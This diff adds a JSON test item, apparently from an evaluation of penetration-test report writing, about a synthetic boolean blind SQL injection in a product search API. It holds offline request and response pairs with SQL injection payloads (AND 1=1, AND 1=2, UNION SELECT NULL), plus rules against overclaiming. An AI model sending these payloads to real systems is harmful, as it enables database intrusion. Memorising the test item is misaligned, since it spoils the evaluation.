@@ -1,0 +1,94 @@
+{
+  "schema_version": 1,
+  "id": "injection",
+  "kind": "http",
+  "name": "商品查询参数布尔盲注",
+  "synthetic": true,
+  "test_time": "2026-11-01T10:00:00+08:00",
+  "target": "https://report-eval.invalid",
+  "facts": {
+    "observations": [
+      "已登录用户的正常关键词 alpha 返回 1 条测试商品。",
+      "在相同关键词后追加真假 SQL 条件，每种条件重复两次，真条件都返回 1 条，假条件都返回 0 条。",
+      "UNION 请求返回 400，未取得查询结果。"
+    ],
+    "conditions": [
+      "需普通用户身份，测试参数为 name。"
+    ],
+    "limitations": [
+      "未读取数据库版本、表结构或其他用户数据。",
+      "没有验证写入、命令执行或跨系统影响。"
+    ],
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"
+  },
+  "evidence": [
+    {
+      "id": "E01",
+      "purpose": "正常搜索",
+      "source": "离线合成报文，不对应真实网络请求",
+      "request_complete": true,
+      "response_complete": true,
+      "request": "GET /api/products?name=alpha HTTP/1.1\r\nHost: report-eval.invalid\r\nX-Eval-Actor: user-a\r\nContent-Length: 0\r\n\r\n",
+      "response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 55\r\n\r\n{\"items\":[{\"id\":\"product-a\",\"name\":\"alpha\"}],\"total\":1}"
+    },
+    {
+      "id": "E02",
+      "purpose": "真条件搜索",
+      "source": "离线合成报文，不对应真实网络请求",
+      "request_complete": true,
+      "response_complete": true,
+      "request": "GET /api/products?name=alpha%27%20AND%201%3D1--%20 HTTP/1.1\r\nHost: report-eval.invalid\r\nX-Eval-Actor: user-a\r\nContent-Length: 0\r\n\r\n",
+      "response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 55\r\n\r\n{\"items\":[{\"id\":\"product-a\",\"name\":\"alpha\"}],\"total\":1}"
+    },
+    {
+      "id": "E03",
+      "purpose": "假条件搜索",
+      "source": "离线合成报文，不对应真实网络请求",
+      "request_complete": true,
+      "response_complete": true,
+      "request": "GET /api/products?name=alpha%27%20AND%201%3D2--%20 HTTP/1.1\r\nHost: report-eval.invalid\r\nX-Eval-Actor: user-a\r\nContent-Length: 0\r\n\r\n",
+      "response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 22\r\n\r\n{\"items\":[],\"total\":0}"
+    },
+    {
+      "id": "E04",
+      "purpose": "再次发送真条件搜索",
+      "source": "离线合成报文，不对应真实网络请求",
+      "request_complete": true,
+      "response_complete": true,
+      "request": "GET /api/products?name=alpha%27%20AND%201%3D1--%20 HTTP/1.1\r\nHost: report-eval.invalid\r\nX-Eval-Actor: user-a\r\nContent-Length: 0\r\n\r\n",
+      "response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 55\r\n\r\n{\"items\":[{\"id\":\"product-a\",\"name\":\"alpha\"}],\"total\":1}"
+    },
+    {
+      "id": "E05",
+      "purpose": "再次发送假条件搜索",
+      "source": "离线合成报文，不对应真实网络请求",
+      "request_complete": true,
+      "response_complete": true,
+      "request": "GET /api/products?name=alpha%27%20AND%201%3D2--%20 HTTP/1.1\r\nHost: report-eval.invalid\r\nX-Eval-Actor: user-a\r\nContent-Length: 0\r\n\r\n",
+      "response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 22\r\n\r\n{\"items\":[],\"total\":0}"
+    },
+    {
+      "id": "E06",
+      "purpose": "UNION 方式搜索",
+      "source": "离线合成报文，不对应真实网络请求",
+      "request_complete": true,
+      "response_complete": true,
+      "request": "GET /api/products?name=alpha%27%20UNION%20SELECT%20NULL--%20 HTTP/1.1\r\nHost: report-eval.invalid\r\nX-Eval-Actor: user-a\r\nContent-Length: 0\r\n\r\n",
+      "response": "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nContent-Length: 26\r\n\r\n{\"error\":\"query_rejected\"}"
+    }
+  ],
+  "review": {
+    "must_preserve": [
+      "保留相同基线、两组真假条件及各重复两次的结果。",
+      "说明 UNION 失败，不能写成全部注入方式均成功。"
+    ],
+    "must_not_claim": [
+      "不得声称已导出全库、数据库类型已确定、能够执行系统命令或修改数据。"
+    ],
+    "evidence_gaps": [
+      "未读取数据库版本、表结构或其他用户数据。",
+      "没有验证写入、命令执行或跨系统影响。"
+    ]
+  },
+  "reference_report": "injection.reference.md"
+}
